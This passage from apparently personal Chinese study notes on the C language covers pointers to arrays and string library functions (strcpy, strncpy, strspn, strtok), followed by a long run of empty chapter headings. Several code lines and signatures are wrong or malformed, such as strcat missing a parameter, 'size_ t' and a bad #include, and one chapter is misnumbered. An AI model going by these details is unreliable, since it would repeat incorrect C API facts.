        太妙了！！！</span><br></pre></td></tr></table></figure>

<h4 id="8-2-4-指向数组的指针"><a href="#8-2-4-指向数组的指针" class="headerlink" title="8.2.4 指向数组的指针"></a>8.2.4 指向数组的指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">10</span>],*b=a;</span><br><span class="line"><span class="type">int</span> c[<span class="number">3</span>][<span class="number">10</span>],*d=c;<span class="comment">//非法，初始化错误</span></span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>];<span class="comment">//下标引用的优先级高于间接访问，[]使得间接访问首先执行</span></span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">10</span>] = a;<span class="comment">//使p指向a的第一行</span></span><br><span class="line"><span class="type">int</span> *pi=&amp;a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line"><span class="type">int</span> *pi=a[<span class="number">0</span>];<span class="comment">//指向a的第一个整型元素</span></span><br></pre></td></tr></table></figure>

<h4 id="8-2-5-作为函数参数的多维数组"><a href="#8-2-5-作为函数参数的多维数组" class="headerlink" title="8.2.5 作为函数参数的多维数组"></a>8.2.5 作为函数参数的多维数组</h4><h4 id="8-2-6-初始化"><a href="#8-2-6-初始化" class="headerlink" title="8.2.6 初始化"></a>8.2.6 初始化</h4><h4 id="8-2-7-数组长度自动计算"><a href="#8-2-7-数组长度自动计算" class="headerlink" title="8.2.7 数组长度自动计算"></a>8.2.7 数组长度自动计算</h4><h3 id="8-3-指针数组"><a href="#8-3-指针数组" class="headerlink" title="8.3 指针数组"></a>8.3 指针数组</h3><h3 id="8-4-总结"><a href="#8-4-总结" class="headerlink" title="8.4 总结"></a>8.4 总结</h3><h3 id="8-5-警告的总结"><a href="#8-5-警告的总结" class="headerlink" title="8.5 警告的总结"></a>8.5 警告的总结</h3><h3 id="8-6-编程提示的总结"><a href="#8-6-编程提示的总结" class="headerlink" title="8.6 编程提示的总结"></a>8.6 编程提示的总结</h3><h3 id="8-7-问题"><a href="#8-7-问题" class="headerlink" title="8.7 问题"></a>8.7 问题</h3><h3 id="8-8-编程练习"><a href="#8-8-编程练习" class="headerlink" title="8.8 编程练习"></a>8.8 编程练习</h3><h2 id="第九章-字符串、字符和字节"><a href="#第九章-字符串、字符和字节" class="headerlink" title="第九章 字符串、字符和字节"></a>第九章 字符串、字符和字节</h2><p>&lt;string.h&gt;<br>字符串以字符串常量的形式出现或者存储于字符数组中——C语言没有显式的字符串数据类型.</p>
<h3 id="9-1-字符串基础"><a href="#9-1-字符串基础" class="headerlink" title="9.1 字符串基础"></a>9.1 字符串基础</h3><p>‘\0’结尾<br>NUL</p>
<h3 id="9-2-字符串长度"><a href="#9-2-字符串长度" class="headerlink" title="9.2 字符串长度"></a>9.2 字符串长度</h3><p>size_t strlen(char const *string)<br>size_t是在头文件stddef.h中定义的,是一个无符号整数类型<br>寻找一种更好的算法比改良一种差劲的算法更有效率<br>复现已经存在的软件比重用已经存在的软件比重新开发一个效率更高</p>
<h3 id="9-3-不受限制的字符串函数"><a href="#9-3-不受限制的字符串函数" class="headerlink" title="9.3 不受限制的字符串函数"></a>9.3 不受限制的字符串函数</h3><p>程序员要自己判断</p>
<h4 id="9-3-1-复制字符串"><a href="#9-3-1-复制字符串" class="headerlink" title="9.3.1 复制字符串"></a>9.3.1 复制字符串</h4><p>char *strcpy(char *dst,char const *src)</p>
<h4 id="9-3-2-连接字符串"><a href="#9-3-2-连接字符串" class="headerlink" title="9.3.2 连接字符串"></a>9.3.2 连接字符串</h4><p>char *strcat(char *dst)</p>
<h4 id="9-3-3-函数的返回值"><a href="#9-3-3-函数的返回值" class="headerlink" title="9.3.3 函数的返回值"></a>9.3.3 函数的返回值</h4><p>返回一个指向目标函数的指针——可以嵌套使用<br>strcat(strcpy(dst,a), b)<br>很多时候他们的返回值都会被忽略</p>
<h4 id="9-3-4-字符串比较"><a href="#9-3-4-字符串比较" class="headerlink" title="9.3.4 字符串比较"></a>9.3.4 字符串比较</h4><p>int strcmp(char const *s1,char const *s2)<br>s1&lt;s2  &lt;0<br>s1&gt;s2  &gt;0<br>s1&#x3D;s2  &#x3D;0</p>
<h3 id="9-4-长度受限的字符串函数"><a href="#9-4-长度受限的字符串函数" class="headerlink" title="9.4 长度受限的字符串函数"></a>9.4 长度受限的字符串函数</h3><p>还有一些函数以另一种不同的方式处理字符串，这些函数接收一个显式的长度参数，这种机制可以防止难以预料的长字符串从他们的目标数组溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">( <span class="type">char</span> *dst, <span class="type">char</span> <span class="type">const</span> *src, size_ t len )</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncat</span><span class="params">( <span class="type">char</span> *dst, <span class="type">char</span> <span class="type">const</span> *src, size_ t len )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">( <span class="type">char</span> <span class="type">const</span> *s1, <span class="type">char</span> <span class="type">const</span> *s2， size_ <span class="type">_t</span> len)</span>;</span><br></pre></td></tr></table></figure>

<p>strncpy：如果strlen(src)&lt;len——自动用NULL补齐<br>如果strlen(src)&gt;len——有多少就复制多少 ！：它的值不以NUL字节结尾</p>
<h3 id="9-5-字符串查找基础"><a href="#9-5-字符串查找基础" class="headerlink" title="9.5 字符串查找基础"></a>9.5 字符串查找基础</h3><h4 id="9-5-1-查找一个字符"><a href="#9-5-1-查找一个字符" class="headerlink" title="9.5.1 查找一个字符"></a>9.5.1 查找一个字符</h4><p>找到后返回一个指向该位置的指针，if not just return NULL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strchr</span><span class="params">(<span class="type">char</span> <span class="type">const</span> *str,<span class="type">int</span> ch)</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strrchr</span><span class="params">(<span class="type">char</span> <span class="type">const</span> *str,<span class="type">int</span> ch)</span><span class="comment">//她所返回的是一个指向字符串中该字符最后出现的位置（当有多个值时，即最右边那个）</span></span><br></pre></td></tr></table></figure>

<h4 id="9-5-2-查找任何几个字符"><a href="#9-5-2-查找任何几个字符" class="headerlink" title="9.5.2 查找任何几个字符"></a>9.5.2 查找任何几个字符</h4><p>查找任何一组字符第一次在字符串中出现的位置<br>char *strpbrk( char const *str, char const *group)<br>返回一个指向str中第一个匹配group中任何一个字符的字符位置，if not just return NULL</p>
<h4 id="9-5-3-查找一个子串-‘-0’"><a href="#9-5-3-查找一个子串-‘-0’" class="headerlink" title="9.5.3 查找一个子串(‘\0’)"></a>9.5.3 查找一个子串(‘\0’)</h4><p>char *strstr( char const *s1, char const *s2)<br>返回一个指向s1中第一个匹配s2中第一个一个字符的字符位置，if not just return NULL</p>
<h3 id="9-6-高级字符串查找"><a href="#9-6-高级字符串查找" class="headerlink" title="9.6 高级字符串查找"></a>9.6 高级字符串查找</h3><p>简化从一个字符串中查找和抽取一个子串的过程</p>
<h4 id="9-6-1-查找一个字符串前缀"><a href="#9-6-1-查找一个字符串前缀" class="headerlink" title="9.6.1 查找一个字符串前缀"></a>9.6.1 查找一个字符串<strong>前缀</strong></h4><p>strspn、strcspn用于在字符串的起始位置对字符计数<br>size_t strspn( char const *str, char const *group)<br>就是从str的第一个元素开始往后数，看str中是不是连续往后每个字符都在group中可以找到。到第一个不在gruop的元素为止。看从str第一个开始，前面的字符有几个在group中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string &gt;</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> len1, len2;</span><br><span class="line">	<span class="type">char</span> buffer[] = <span class="string">&quot;25,142,330,Smith,J,239-4123&quot;</span>;</span><br><span class="line"></span><br><span class="line">	len1 = <span class="built_in">strspn</span>(buffer, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line">	len2 = <span class="built_in">strspn</span>(buffer, <span class="string">&quot;,0123456789&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  len1为：%d；  len2为：%d&quot;</span>, len1, len2);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;                结果len1=<span class="number">2</span>;len2=<span class="number">11</span>;</span><br></pre></td></tr></table></figure>

<p>size_t strcspn( char const *str, char const *group)<br>用来检索字符串s1开头连续有几个字符都不含字符串s2中的字符<br>strcspn中的C来源于求补这个概念</p>
<h4 id="9-6-2-查找标记"><a href="#9-6-2-查找标记" class="headerlink" title="9.6.2 查找标记"></a>9.6.2 查找标记</h4><p>从字符串中隔离各个单独的称为标记（token）的部分，并丢弃分隔符<br>char *strtok( char *str,char const *sep)<br>为什么str前面无const——strtok函数会修改它所处理的字符串<br>if str const 则复制一份在传递给strtok函数</p>
<h3 id="9-7-错误信息"><a href="#9-7-错误信息" class="headerlink" title="9.7 错误信息"></a>9.7 错误信息</h3><h3 id="9-8-字符操作"><a href="#9-8-字符操作" class="headerlink" title="9.8 字符操作"></a>9.8 字符操作</h3><h3 id="9-9-内存操作"><a href="#9-9-内存操作" class="headerlink" title="9.9 内存操作"></a>9.9 内存操作</h3><h3 id="9-10-总结"><a href="#9-10-总结" class="headerlink" title="9.10 总结"></a>9.10 总结</h3><h3 id="9-11-警告的总结"><a href="#9-11-警告的总结" class="headerlink" title="9.11 警告的总结"></a>9.11 警告的总结</h3><h3 id="9-12-编程提示的总结"><a href="#9-12-编程提示的总结" class="headerlink" title="9.12 编程提示的总结"></a>9.12 编程提示的总结</h3><h3 id="9-13-问题"><a href="#9-13-问题" class="headerlink" title="9.13 问题"></a>9.13 问题</h3><h3 id="9-14-编程练习"><a href="#9-14-编程练习" class="headerlink" title="9.14 编程练习"></a>9.14 编程练习</h3><h2 id="第十章-结构和联合"><a href="#第十章-结构和联合" class="headerlink" title="第十章 结构和联合"></a>第十章 结构和联合</h2><h3 id="10-1-结构基础知识"><a href="#10-1-结构基础知识" class="headerlink" title="10.1 结构基础知识"></a>10.1 结构基础知识</h3><h4 id="10-1-1-结构声明"><a href="#10-1-1-结构声明" class="headerlink" title="10.1.1 结构声明"></a>10.1.1 结构声明</h4><h4 id="10-1-2-结构成员"><a href="#10-1-2-结构成员" class="headerlink" title="10.1.2 结构成员"></a>10.1.2 结构成员</h4><h4 id="10-1-3-结构成员的直接访问"><a href="#10-1-3-结构成员的直接访问" class="headerlink" title="10.1.3 结构成员的直接访问"></a>10.1.3 结构成员的直接访问</h4><h4 id="10-1-4-结构成员的间接访问"><a href="#10-1-4-结构成员的间接访问" class="headerlink" title="10.1.4 结构成员的间接访问"></a>10.1.4 结构成员的间接访问</h4><h4 id="10-1-5-结构的自引用"><a href="#10-1-5-结构的自引用" class="headerlink" title="10.1.5 结构的自引用"></a>10.1.5 结构的自引用</h4><h4 id="10-1-6-不完整的声明"><a href="#10-1-6-不完整的声明" class="headerlink" title="10.1.6 不完整的声明"></a>10.1.6 不完整的声明</h4><h4 id="10-1-7-结构的初始化"><a href="#10-1-7-结构的初始化" class="headerlink" title="10.1.7 结构的初始化"></a>10.1.7 结构的初始化</h4><h3 id="10-2-结构、指针和成员"><a href="#10-2-结构、指针和成员" class="headerlink" title="10.2 结构、指针和成员"></a>10.2 结构、指针和成员</h3><h4 id="10-2-1-访问指针"><a href="#10-2-1-访问指针" class="headerlink" title="10.2.1 访问指针"></a>10.2.1 访问指针</h4><h4 id="10-2-1-访问结构"><a href="#10-2-1-访问结构" class="headerlink" title="10.2.1 访问结构"></a>10.2.1 访问结构</h4><h4 id="10-2-1-访问结构成员"><a href="#10-2-1-访问结构成员" class="headerlink" title="10.2.1 访问结构成员"></a>10.2.1 访问结构成员</h4><h4 id="10-2-1-访问嵌套的结构"><a href="#10-2-1-访问嵌套的结构" class="headerlink" title="10.2.1 访问嵌套的结构"></a>10.2.1 访问嵌套的结构</h4><h4 id="10-2-1-访问指针成员"><a href="#10-2-1-访问指针成员" class="headerlink" title="10.2.1 访问指针成员"></a>10.2.1 访问指针成员</h4><h3 id="10-3-结构的存储分配"><a href="#10-3-结构的存储分配" class="headerlink" title="10.3 结构的存储分配"></a>10.3 结构的存储分配</h3><h3 id="10-4-作为函数参数的结构"><a href="#10-4-作为函数参数的结构" class="headerlink" title="10.4 作为函数参数的结构"></a>10.4 作为函数参数的结构</h3><h3 id="10-5-位段"><a href="#10-5-位段" class="headerlink" title="10.5 位段"></a>10.5 位段</h3><h3 id="10-6-联合"><a href="#10-6-联合" class="headerlink" title="10.6 联合"></a>10.6 联合</h3><h4 id="10-6-1-变体记录"><a href="#10-6-1-变体记录" class="headerlink" title="10.6.1 变体记录"></a>10.6.1 变体记录</h4><h4 id="10-6-2-联合初始化"><a href="#10-6-2-联合初始化" class="headerlink" title="10.6.2 联合初始化"></a>10.6.2 联合初始化</h4><h3 id="10-7-总结"><a href="#10-7-总结" class="headerlink" title="10.7 总结"></a>10.7 总结</h3><h3 id="10-8-警告的总结"><a href="#10-8-警告的总结" class="headerlink" title="10.8 警告的总结"></a>10.8 警告的总结</h3><h3 id="10-9-编程提示的总结"><a href="#10-9-编程提示的总结" class="headerlink" title="10.9 编程提示的总结"></a>10.9 编程提示的总结</h3><h3 id="10-10-问题"><a href="#10-10-问题" class="headerlink" title="10.10 问题"></a>10.10 问题</h3><h3 id="10-11-编程练习"><a href="#10-11-编程练习" class="headerlink" title="10.11 编程练习"></a>10.11 编程练习</h3><h2 id="第十一章-动态内存分配"><a href="#第十一章-动态内存分配" class="headerlink" title="第十一章 动态内存分配"></a>第十一章 动态内存分配</h2><h3 id="11-1-为什么使用动态内存配"><a href="#11-1-为什么使用动态内存配" class="headerlink" title="11.1 为什么使用动态内存配"></a>11.1 为什么使用动态内存配</h3><h3 id="11-2-malloc和free"><a href="#11-2-malloc和free" class="headerlink" title="11.2 malloc和free"></a>11.2 malloc和free</h3><h3 id="11-3-calloc和realloc"><a href="#11-3-calloc和realloc" class="headerlink" title="11.3 calloc和realloc"></a>11.3 calloc和realloc</h3><h3 id="11-4-使用动态分配的内存"><a href="#11-4-使用动态分配的内存" class="headerlink" title="11.4 使用动态分配的内存"></a>11.4 使用动态分配的内存</h3><h3 id="11-5-常见的动态内存错误"><a href="#11-5-常见的动态内存错误" class="headerlink" title="11.5 常见的动态内存错误"></a>11.5 常见的动态内存错误</h3><h3 id="11-6-内存分配实例"><a href="#11-6-内存分配实例" class="headerlink" title="11.6 内存分配实例"></a>11.6 内存分配实例</h3><h3 id="11-7-总结"><a href="#11-7-总结" class="headerlink" title="11.7 总结"></a>11.7 总结</h3><h3 id="11-8-警告的总结"><a href="#11-8-警告的总结" class="headerlink" title="11.8 警告的总结"></a>11.8 警告的总结</h3><h3 id="11-9-编程提示的总结"><a href="#11-9-编程提示的总结" class="headerlink" title="11.9 编程提示的总结"></a>11.9 编程提示的总结</h3><h3 id="11-10-问题"><a href="#11-10-问题" class="headerlink" title="11.10 问题"></a>11.10 问题</h3><h3 id="11-11-编程练习"><a href="#11-11-编程练习" class="headerlink" title="11.11 编程练习"></a>11.11 编程练习</h3><h2 id="第十二章-使用结构和指针"><a href="#第十二章-使用结构和指针" class="headerlink" title="第十二章 使用结构和指针"></a>第十二章 使用结构和指针</h2><h3 id="12-1-链表"><a href="#12-1-链表" class="headerlink" title="12.1 链表"></a>12.1 链表</h3><h3 id="12-2-单链表"><a href="#12-2-单链表" class="headerlink" title="12.2 单链表"></a>12.2 单链表</h3><h4 id="12-2-1-在单链表中插入"><a href="#12-2-1-在单链表中插入" class="headerlink" title="12.2.1 在单链表中插入"></a>12.2.1 在单链表中插入</h4><h4 id="12-2-2-其他链表操作"><a href="#12-2-2-其他链表操作" class="headerlink" title="12.2.2 其他链表操作"></a>12.2.2 其他链表操作</h4><h3 id="12-3-双链表"><a href="#12-3-双链表" class="headerlink" title="12.3 双链表"></a>12.3 双链表</h3><h4 id="12-3-1-在双链表中插入"><a href="#12-3-1-在双链表中插入" class="headerlink" title="12.3.1 在双链表中插入"></a>12.3.1 在双链表中插入</h4><h4 id="12-3-2-其他链表操作"><a href="#12-3-2-其他链表操作" class="headerlink" title="12.3.2 其他链表操作"></a>12.3.2 其他链表操作</h4><h3 id="12-4-总结"><a href="#12-4-总结" class="headerlink" title="12.4 总结"></a>12.4 总结</h3><h3 id="12-5-警告的总结"><a href="#12-5-警告的总结" class="headerlink" title="12.5 警告的总结"></a>12.5 警告的总结</h3><h3 id="12-6-编程提示的总结"><a href="#12-6-编程提示的总结" class="headerlink" title="12.6 编程提示的总结"></a>12.6 编程提示的总结</h3><h3 id="12-7-问题"><a href="#12-7-问题" class="headerlink" title="12.7 问题"></a>12.7 问题</h3><h3 id="12-8-编程练习"><a href="#12-8-编程练习" class="headerlink" title="12.8 编程练习"></a>12.8 编程练习</h3><h2 id="第十八章-高级指针话题"><a href="#第十八章-高级指针话题" class="headerlink" title="第十八章 高级指针话题"></a>第十八章 高级指针话题</h2><h3 id="13-1-进一步探讨指向指针的指针"><a href="#13-1-进一步探讨指向指针的指针" class="headerlink" title="13.1 进一步探讨指向指针的指针"></a>13.1 进一步探讨指向指针的指针</h3><h3 id="13-2-高级声明"><a href="#13-2-高级声明" class="headerlink" title="13.2 高级声明"></a>13.2 高级声明</h3><h3 id="13-3-函数指针"><a href="#13-3-函数指针" class="headerlink" title="13.3 函数指针"></a>13.3 函数指针</h3><h4 id="13-3-1-回调函数"><a href="#13-3-1-回调函数" class="headerlink" title="13.3.1 回调函数"></a>13.3.1 回调函数</h4><h4 id="13-3-2-转移表"><a href="#13-3-2-转移表" class="headerlink" title="13.3.2 转移表"></a>13.3.2 转移表</h4><h3 id="13-4-命令行参数"><a href="#13-4-命令行参数" class="headerlink" title="13.4 命令行参数"></a>13.4 命令行参数</h3><h4 id="13-4-1-传递命令行参数"><a href="#13-4-1-传递命令行参数" class="headerlink" title="13.4.1 传递命令行参数"></a>13.4.1 传递命令行参数</h4><h4 id="13-4-2-处理命令行参数"><a href="#13-4-2-处理命令行参数" class="headerlink" title="13.4.2 处理命令行参数"></a>13.4.2 处理命令行参数</h4><h3 id="13-5-字符串常量"><a href="#13-5-字符串常量" class="headerlink" title="13.5 字符串常量"></a>13.5 字符串常量</h3><h3 id="13-6-总结"><a href="#13-6-总结" class="headerlink" title="13.6 总结"></a>13.6 总结</h3><h3 id="13-7-警告的总结"><a href="#13-7-警告的总结" class="headerlink" title="13.7 警告的总结"></a>13.7 警告的总结</h3><h3 id="13-8-编程提示的总结"><a href="#13-8-编程提示的总结" class="headerlink" title="13.8 编程提示的总结"></a>13.8 编程提示的总结</h3><h3 id="13-9-问题"><a href="#13-9-问题" class="headerlink" title="13.9 问题"></a>13.9 问题</h3><h3 id="13-10-编程练习"><a href="#13-10-编程练习" class="headerlink" title="13.10 编程练习"></a>13.10 编程练习</h3><h2 id="第十四章-预处理器"><a href="#第十四章-预处理器" class="headerlink" title="第十四章 预处理器"></a>第十四章 预处理器</h2><h3 id="14-1-预定义符号"><a href="#14-1-预定义符号" class="headerlink" title="14.1 预定义符号"></a>14.1 预定义符号</h3><h3 id="14-2-define"><a href="#14-2-define" class="headerlink" title="14.2 #define"></a>14.2 #define</h3><h4 id="14-2-1-宏"><a href="#14-2-1-宏" class="headerlink" title="14.2.1 宏"></a>14.2.1 宏</h4><h4 id="14-2-2-define函数"><a href="#14-2-2-define函数" class="headerlink" title="14.2.2 #define函数"></a>14.2.2 #define函数</h4><h4 id="14-2-3-宏与函数"><a href="#14-2-3-宏与函数" class="headerlink" title="14.2.3 宏与函数"></a>14.2.3 宏与函数</h4><h4 id="14-2-4-带副作用的宏参数"><a href="#14-2-4-带副作用的宏参数" class="headerlink" title="14.2.4 带副作用的宏参数"></a>14.2.4 带副作用的宏参数</h4><h4 id="14-2-5-命名约定"><a href="#14-2-5-命名约定" class="headerlink" title="14.2.5 命名约定"></a>14.2.5 命名约定</h4><h4 id="14-2-6-undef"><a href="#14-2-6-undef" class="headerlink" title="14.2.6 #undef"></a>14.2.6 #undef</h4><h4 id="14-2-7-命令行定义"><a href="#14-2-7-命令行定义" class="headerlink" title="14.2.7 命令行定义"></a>14.2.7 命令行定义</h4><h4 id="14-3-条件包含"><a href="#14-3-条件包含" class="headerlink" title="14.3 条件包含"></a>14.3 条件包含</h4><h4 id="14-3-1-是否被定义"><a href="#14-3-1-是否被定义" class="headerlink" title="14.3.1 是否被定义"></a>14.3.1 是否被定义</h4><h4 id="14-3-2-嵌套指令"><a href="#14-3-2-嵌套指令" class="headerlink" title="14.3.2 嵌套指令"></a>14.3.2 嵌套指令</h4><h3 id="14-4-文件包含"><a href="#14-4-文件包含" class="headerlink" title="14.4 文件包含"></a>14.4 文件包含</h3><h4 id="14-4-1-函数库文件包含"><a href="#14-4-1-函数库文件包含" class="headerlink" title="14.4.1 函数库文件包含"></a>14.4.1 函数库文件包含</h4><h4 id="14-4-2-本地文件包含"><a href="#14-4-2-本地文件包含" class="headerlink" title="14.4.2 本地文件包含"></a>14.4.2 本地文件包含</h4><h4 id="14-4-3-嵌套文件包含"><a href="#14-4-3-嵌套文件包含" class="headerlink" title="14.4.3 嵌套文件包含"></a>14.4.3 嵌套文件包含</h4><h3 id="14-5-其他指令"><a href="#14-5-其他指令" class="headerlink" title="14.5 其他指令"></a>14.5 其他指令</h3><h3 id="14-6-总结"><a href="#14-6-总结" class="headerlink" title="14.6 总结"></a>14.6 总结</h3><h3 id="14-7-警告的总结"><a href="#14-7-警告的总结" class="headerlink" title="14.7 警告的总结"></a>14.7 警告的总结</h3><h3 id="14-8-编程提示的总结"><a href="#14-8-编程提示的总结" class="headerlink" title="14.8 编程提示的总结"></a>14.8 编程提示的总结</h3><h3 id="14-9-问题"><a href="#14-9-问题" class="headerlink" title="14.9 问题"></a>14.9 问题</h3><h3 id="14-10-编程练习"><a href="#14-10-编程练习" class="headerlink" title="14.10 编程练习"></a>14.10 编程练习</h3><h2 id="第十五章-输入-x2F-输出函数"><a href="#第十五章-输入-x2F-输出函数" class="headerlink" title="第十五章 输入&#x2F;输出函数"></a>第十五章 输入&#x2F;输出函数</h2><h3 id="15-1-错误报告"><a href="#15-1-错误报告" class="headerlink" title="15.1 错误报告"></a>15.1 错误报告</h3><h3 id="15-2-终止执行"><a href="#15-2-终止执行" class="headerlink" title="15.2 终止执行"></a>15.2 终止执行</h3><h3 id="15-3-标准I-x2F-O函数库"><a href="#15-3-标准I-x2F-O函数库" class="headerlink" title="15.3 标准I&#x2F;O函数库"></a>15.3 标准I&#x2F;O函数库</h3><h3 id="15-4-ANSI-I-x2F-O概念"><a href="#15-4-ANSI-I-x2F-O概念" class="headerlink" title="15.4 ANSI I&#x2F;O概念"></a>15.4 ANSI I&#x2F;O概念</h3><h4 id="15-4-1-流"><a href="#15-4-1-流" class="headerlink" title="15.4.1 流"></a>15.4.1 流</h4><h4 id="15-4-2-文件"><a href="#15-4-2-文件" class="headerlink" title="15.4.2 文件"></a>15.4.2 文件</h4><h4 id="15-4-3-标准I-x2F-O常量"><a href="#15-4-3-标准I-x2F-O常量" class="headerlink" title="15.4.3 标准I&#x2F;O常量"></a>15.4.3 标准I&#x2F;O常量</h4><h3 id="15-5-流I-x2F-O总览"><a href="#15-5-流I-x2F-O总览" class="headerlink" title="15.5 流I&#x2F;O总览"></a>15.5 流I&#x2F;O总览</h3><h3 id="15-6-打开流"><a href="#15-6-打开流" class="headerlink" title="15.6 打开流"></a>15.6 打开流</h3><h3 id="15-7-关闭流"><a href="#15-7-关闭流" class="headerlink" title="15.7 关闭流"></a>15.7 关闭流</h3><h3 id="15-8-字符I-x2F-O"><a href="#15-8-字符I-x2F-O" class="headerlink" title="15.8 字符I&#x2F;O"></a>15.8 字符I&#x2F;O</h3><h4 id="15-8-1-字符I-x2F-O宏"><a href="#15-8-1-字符I-x2F-O宏" class="headerlink" title="15.8.1 字符I&#x2F;O宏"></a>15.8.1 字符I&#x2F;O宏</h4><h4 id="15-8-2-撤销字符I-x2F-O"><a href="#15-8-2-撤销字符I-x2F-O" class="headerlink" title="15.8.2 撤销字符I&#x2F;O"></a>15.8.2 撤销字符I&#x2F;O</h4><h3 id="15-9-未格式化的行I-x2F-O"><a href="#15-9-未格式化的行I-x2F-O" class="headerlink" title="15.9 未格式化的行I&#x2F;O"></a>15.9 未格式化的行I&#x2F;O</h3><h3 id="15-10-格式化的行I-x2F-O"><a href="#15-10-格式化的行I-x2F-O" class="headerlink" title="15.10 格式化的行I&#x2F;O"></a>15.10 格式化的行I&#x2F;O</h3><h4 id="15-10-1-scanf家族"><a href="#15-10-1-scanf家族" class="headerlink" title="15.10.1 scanf家族"></a>15.10.1 scanf家族</h4><h4 id="15-10-2-scanf格式代码"><a href="#15-10-2-scanf格式代码" class="headerlink" title="15.10.2 scanf格式代码"></a>15.10.2 scanf格式代码</h4><h4 id="15-10-3-printf家族"><a href="#15-10-3-printf家族" class="headerlink" title="15.10.3 printf家族"></a>15.10.3 printf家族</h4><h4 id="15-10-4-printf格式代码"><a href="#15-10-4-printf格式代码" class="headerlink" title="15.10.4 printf格式代码"></a>15.10.4 printf格式代码</h4><h3 id="15-11-二进制I-x2F-O"><a href="#15-11-二进制I-x2F-O" class="headerlink" title="15.11 二进制I&#x2F;O"></a>15.11 二进制I&#x2F;O</h3><h3 id="15-12-刷新和定位函数"><a href="#15-12-刷新和定位函数" class="headerlink" title="15.12 刷新和定位函数"></a>15.12 刷新和定位函数</h3><h3 id="15-13-改变缓冲方式"><a href="#15-13-改变缓冲方式" class="headerlink" title="15.13 改变缓冲方式"></a>15.13 改变缓冲方式</h3><h3 id="15-14-流错误函数"><a href="#15-14-流错误函数" class="headerlink" title="15.14 流错误函数"></a>15.14 流错误函数</h3><h3 id="15-15-临时文件"><a href="#15-15-临时文件" class="headerlink" title="15.15 临时文件"></a>15.15 临时文件</h3><h3 id="15-16-文件操纵函数"><a href="#15-16-文件操纵函数" class="headerlink" title="15.16 文件操纵函数"></a>15.16 文件操纵函数</h3><h3 id="15-17-总结"><a href="#15-17-总结" class="headerlink" title="15.17 总结"></a>15.17 总结</h3><h3 id="15-18-警告的总结"><a href="#15-18-警告的总结" class="headerlink" title="15.18 警告的总结"></a>15.18 警告的总结</h3><h3 id="15-19-编程提示的总结"><a href="#15-19-编程提示的总结" class="headerlink" title="15.19 编程提示的总结"></a>15.19 编程提示的总结</h3><h3 id="15-20-问题"><a href="#15-20-问题" class="headerlink" title="15.20 问题"></a>15.20 问题</h3><h3 id="15-21-编程练习"><a href="#15-21-编程练习" class="headerlink" title="15.21 编程练习"></a>15.21 编程练习</h3><h2 id="第十六章-标准函数库"><a href="#第十六章-标准函数库" class="headerlink" title="第十六章 标准函数库"></a>第十六章 标准函数库</h2><h3 id="16-1-整型函数"><a href="#16-1-整型函数" class="headerlink" title="16.1 整型函数"></a>16.1 整型函数</h3><h4 id="16-1-1-算术-lt-stdilb-h-gt"><a href="#16-1-1-算术-lt-stdilb-h-gt" class="headerlink" title="16.1.1 算术 &lt;stdilb.h&gt;"></a>16.1.1 算术 &lt;stdilb.h&gt;</h4><h4 id="16-1-2-随机数-lt-stdlib-h-gt"><a href="#16-1-2-随机数-lt-stdlib-h-gt" class="headerlink" title="16.1.2 随机数 &lt;stdlib.h&gt;"></a>16.1.2 随机数 &lt;stdlib.h&gt;</h4><h4 id="16-1-3-字符串转换-lt-stdilb-h-gt"><a href="#16-1-3-字符串转换-lt-stdilb-h-gt" class="headerlink" title="16.1.3 字符串转换 &lt;stdilb.h&gt;"></a>16.1.3 字符串转换 &lt;stdilb.h&gt;</h4><h3 id="16-2-浮点型函数"><a href="#16-2-浮点型函数" class="headerlink" title="16.2 浮点型函数"></a>16.2 浮点型函数</h3><h4 id="16-2-1-三角函数-lt-math-h-gt"><a href="#16-2-1-三角函数-lt-math-h-gt" class="headerlink" title="16.2.1 三角函数 &lt;math.h&gt;"></a>16.2.1 三角函数 &lt;math.h&gt;</h4><h4 id="16-2-2-双曲函数-lt-math-h-gt"><a href="#16-2-2-双曲函数-lt-math-h-gt" class="headerlink" title="16.2.2 双曲函数 &lt;math.h&gt;"></a>16.2.2 双曲函数 &lt;math.h&gt;</h4><h4 id="16-2-3-对数和指数函数-lt-math-h-gt"><a href="#16-2-3-对数和指数函数-lt-math-h-gt" class="headerlink" title="16.2.3 对数和指数函数 &lt;math.h&gt;"></a>16.2.3 对数和指数函数 &lt;math.h&gt;</h4><h4 id="16-2-4-浮点表示形式-lt-math-h-gt"><a href="#16-2-4-浮点表示形式-lt-math-h-gt" class="headerlink" title="16.2.4 浮点表示形式 &lt;math.h&gt;"></a>16.2.4 浮点表示形式 &lt;math.h&gt;</h4><h4 id="16-2-5-幂-lt-math-h-gt"><a href="#16-2-5-幂-lt-math-h-gt" class="headerlink" title="16.2.5 幂 &lt;math.h&gt;"></a>16.2.5 幂 &lt;math.h&gt;</h4><h4 id="16-2-6-底数、顶数、绝对数、和余数-lt-math-h-gt"><a href="#16-2-6-底数、顶数、绝对数、和余数-lt-math-h-gt" class="headerlink" title="16.2.6 底数、顶数、绝对数、和余数 &lt;math.h&gt;"></a>16.2.6 底数、顶数、绝对数、和余数 &lt;math.h&gt;</h4><h3 id="16-3-日期和时间函数"><a href="#16-3-日期和时间函数" class="headerlink" title="16.3 日期和时间函数"></a>16.3 日期和时间函数</h3><h4 id="16-3-1-处理器时间-lt-time-h-gt"><a 